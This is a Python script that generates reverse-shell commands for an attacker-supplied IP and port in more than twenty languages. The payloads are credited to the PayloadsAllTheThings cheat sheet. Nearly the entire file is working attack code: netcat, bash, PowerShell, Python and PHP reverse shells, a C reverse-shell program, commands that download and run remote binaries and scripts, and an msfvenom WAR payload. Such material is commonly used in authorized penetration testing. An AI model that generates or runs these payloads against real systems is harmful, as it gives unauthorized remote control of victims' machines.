#	Author: Mason Palma
#	Purpose: Make rev shell selection simple
#	Credit: These rev shells were taken directly from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby
#

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', help='Attacker IP')
parser.add_argument('port', help='port')
parser.add_argument('lang', help='specificy language for rev shell')
args = parser.parse_args()

result = ''

supported_langs = ['bash_tcp', 'bash_udp', 'socat', 'perl', 'python', 'php', 'ruby', 'golang',
 'netcat', 'netcat_openbsd', 'netcat_busybox', 'ncat', 'openssl', 'powershell', 'awk', 
 'java', 'telnet', 'war', 'lua', 'nodejs', 'groovy', 'c', 'dart']

supported_langs.sort()

if args.host:
	if 'host=' in args.host:
		host = args.host.replace('host=', '')
	elif 'host:' in args.host:
		host = args.host.replace('host:', '')
	else:
		host = args.host

if args.port:
	if 'port=' in args.port:
		port = args.port.replace('port=', '')
	elif 'port:' in args.port:
		port = args.port.replace('port:', '')
	else:
		port = args.port

if args.lang:
	if 'lang=' in args.lang:
		lang = args.lang.replace('lang=', '')
	elif 'lang:' in args.lang:
		lang = args.lang.replace('lang:', '')
	else:
		lang = args.lang

if lang not in supported_langs:
	print('\n[*] Language \'%s\' not supported! ' % args.lang)
	print('[*] Supported Languages : %s' % str(supported_langs))

bash_udp = [('''sh -i >& /dev/udp/%s/%s 0>&1''' % (host, port))]

bash_tcp = [
('''bash -i >& /dev/tcp/%s/%s 0>&1''' % (host, port)),
('''0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196''' % (host, port)),
('''/bin/bash -l > /dev/tcp/%s/%s 0<&1 2>&1''' % (host, port))
]

socat = [
('''socat file:`tty`,raw,echo=0 TCP-L:4242 #this is the listener'''),
('''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s''' % (host, port)),
('''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s''' % (host, port))
	]

perl = [
('''perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
''' % (host, port)),
('''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'''' % (host, port)),
('''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'''' % (host, port)),
]

python = [
('''export RHOST="%s";export RPORT=%s;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'# LINUX ONLY''' % (host, port)),
('''python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'# LINUX ONLY''' % (host, port)),
('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'# LINUX ONLY''' % (host, port)),
('''python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("%s",%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("%s",%s));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("%s",%s));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("%s",%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("%s",%s));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])\'# LINUX ONLY''' % (host, port)),
('''python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("%s",%s));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())\'# LINUX ONLY''' % (host, port)),
('''python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("%s",%s,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'# LINUX ONLY -- IPv6''' % (host, port)),
('''python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("%s",%s,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'# LINUX ONLY -- IPv6''' % (host, port)),
('''python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("%s",%s,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\'# LINUX ONLY -- IPv6''' % (host, port)),
('''C:\\Python27\\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('%s', %s)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"# WINDOWS ONLY''' % (host, port))
]

php = [
('''php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'''' % (host, port)),
('''php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'''' % (host, port))
]

ruby = [
('''ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)\'''' % (host, port)),
('''ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%s");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\'''' % (host, port)),
('''ruby -rsocket -e 'c=TCPSocket.new("%s","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\' # WINDOWS ONLY''' % (host, port)),
]

golang = [('''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go''' % (host, port))]

netcat = [
('''nc -e /bin/sh %s %s''' % (host, port)),
('''nc -e /bin/bash %s %s''' % (host, port)),
('''nc -c bash %s %s''' % (host, port))
]


netcat_openbsd = [('''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f''' % (host, port))]

netcat_busybox = [('''rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f''' % (host, port))]

ncat = [
('''ncat %s %s -e /bin/bash''' % (host, port)),
('''ncat --udp %s %s -e /bin/bash''' % (host, port))
]

openssl = [
('user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes'),
('user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port %s' % port),
('user@attack$ ncat --ssl -vv -l -p %s' % port),
('''user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:%s > /tmp/s; rm /tmp/s''' % (host, port))
]

powershell = [
('''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''' % (host, port)),
('''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''' % (host, port)),
('''powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')''')
]

awk = [('''awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''' % (host, port))]

java = [
('''Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();'''),
('''Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();''' % (host, port)),
('''String host="%s";
int port=%s;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''' % (host, port))
]

telnet = [
('''In Attacker machine start two listeners:
nc -lvp %s
nc -lvp %d

In Victime machine run below command:
telnet %s %s | /bin/sh | telnet %s %d''' % (port, (int(port)+1), host, port, host, (int(port)+1)))
]

war = [('''msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file''' % (host, port))]

lua = [
('''lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');" #LINUX ONLY''' % (host, port)),
('''lua5.1 -e 'local host, port = "%s", %s local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\' #LINUX AND WINDOWS''' % (host, port))
]

nodejs = [('''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(%s, "%s", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh %s %s')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc %s %s -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py''' % (port, host, host, port, host, port))]

groovy = [
('''Thread.start {
    // Reverse shell here
}'''), 
('''String host="%s";
int port=%s;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''' % (host, port))
]

c = [('''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
//compile with : gcc /tmp/shell.c --output csh && csh

int main(void){
    int port = %s;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("%s");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}''' % (port, host))]

dart = [('''import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("%s", %s).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}''' % (host, port))]


if 'bash_tcp' in lang:
	result = bash_tcp

elif 'bash_udp' in lang:
	result = bash_udp

elif 'socat' in lang:
	result = socat

elif 'perl' in lang:
	result = perl

elif 'python' in lang:
	result = python

elif 'php' in lang:
	result = php

elif 'ruby' in lang:
	result = ruby

elif 'golang' in lang:
	result = golang

elif 'netcat' in lang:
	result = netcat

elif 'netcat_openbsd' in lang:
	result = netcat_openbsd

elif 'netcat_busybox' in lang:
	result = netcat_busybox

elif 'ncat' in lang:
	result = ncat

elif 'openssl' in lang:
	result = openssl

elif 'powershell' in lang:
	result = powershell

elif 'awk' in lang:
	result = awk

elif 'java' in lang:
	result = java

elif 'telnet' in lang:
	result = telnet

elif 'war' in lang:
	result = war

elif 'lua' in lang:
	result = lua

elif 'nodejs' in lang:
	result = nodejs

elif 'groovy' in lang:
	result = groovy

elif lang == 'c':
	result = c

elif 'dart' in lang:
	result = dart

i = 0
print("")
for r in result:
	print("[%s]\n%s" % (i, r))
	print("")
	i += 1


upgrade_tty = '''ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color'''
